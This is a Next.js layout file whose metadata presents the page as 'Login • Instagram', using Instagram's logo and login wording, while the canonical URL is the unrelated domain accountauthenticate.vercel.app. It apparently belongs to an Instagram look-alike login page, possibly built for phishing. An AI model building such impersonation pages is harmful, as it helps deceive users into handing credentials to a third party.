import type { Metadata } from 'next';
import { Inter } from 'next/font/google';
import '@/styles/globals.css';

const inter = Inter({ subsets: ['latin'] });

export const metadata: Metadata = {
  title: 'Login • Instagram',
  description: 'Instagram Log-in Page built with Next.js',
  icons: {
    icon: '/favicon.ico?v=2',  // ?v=2 forces a fresh load
  },
  openGraph: {
    title: 'Instagram Login',
    description: 'Log in to Instagram to connect with friends and share your moments',
    url: 'https://accountauthenticate.vercel.app',
    siteName: 'Instagram',
    images: [
      {
        url: 'https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png',
        width: 800,
        height: 600,
        alt: 'Instagram Logo',
      },
    ],
    locale: 'en_US',
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Instagram Login',
    description: 'Log in to Instagram to connect with friends and share your moments',
    images: ['https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png'],
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="en">
      <body className={inter.className}>{children}</body>
    </html>
  );
}